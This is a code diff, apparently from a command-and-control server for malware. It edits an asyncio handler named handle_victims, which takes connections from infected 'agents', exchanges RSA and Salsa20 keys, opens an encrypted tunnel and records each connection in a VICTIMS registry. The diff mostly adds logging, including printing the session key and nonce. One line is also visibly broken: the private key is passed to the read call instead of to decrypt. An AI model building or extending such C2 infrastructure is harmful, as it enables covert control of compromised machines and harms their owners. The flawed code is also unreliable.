@@ -148,16 +148,25 @@ async def handle_victims(r: asyncio.streams.StreamReader, w: asyncio.streams.Str
     
     formated_peername = PEERNAME[0] + ':' + str(PEERNAME[1])
     
+    logger.info(f"Agent connected: {PEERNAME}")
+
     # Get a fingerprint (random string)
     fingerprint = await r.read(server_cfg.BUFSIZE)
+
+    logger.info(f"Agent ({PEERNAME}): {fingerprint}")
 
     # Generate rsa keys
     # will be used for key exchange + nonce to start communicating only with Salsa20
     # (which allows its larger data exchange)
-    public_key, private_key = rsa.newkeys(1024)    
+    public_key, private_key = rsa.newkeys(1024) 
+    public_key_pem = rsa.PublicKey.save_pkcs1(public_key)
 
-    w.write(rsa.PublicKey.save_pkcs1(public_key))
+    logger.success(f"RSA key generated\n"+public_key_pem.decode())
+
+    w.write(public_key_pem)
     await w.drain()
+
+    logger.info(f"Agent ({PEERNAME}): RSA key sended")
 
     # Gets the RSA-encrypted string containing the key and nonce
     decrypted = rsa.decrypt(await r.read(server_cfg.BUFSIZE, private_key))
@@ -165,10 +174,13 @@ async def handle_victims(r: asyncio.streams.StreamReader, w: asyncio.streams.Str
     
     key, nonce = decompressed.split(b"<SPR>")
 
-    # Memory clean
+    logger.info(f"Agent ({PEERNAME}): key: {key}, nonce: {nonce}")
+
+    # Memory free
     del(decrypted)
     del(decompressed)
 
+    logger.debug(f"init EncryptedTunnel for {PEERNAME}")
     enctunnel = EncryptedTunnel(r, w, key, nonce)
 
     # Adding to 'VICTIMS' the current victim: {addr: [fingerprint, pc_name, EncryptedTunnel]}
@@ -177,6 +189,7 @@ async def handle_victims(r: asyncio.streams.StreamReader, w: asyncio.streams.Str
     CLIENT_SOCKET.setblocking(0)
     ready = select.select([CLIENT_SOCKET], [], [], 5)
 
+    # Stay alive
     while True:
         time.sleep(5)
         try:
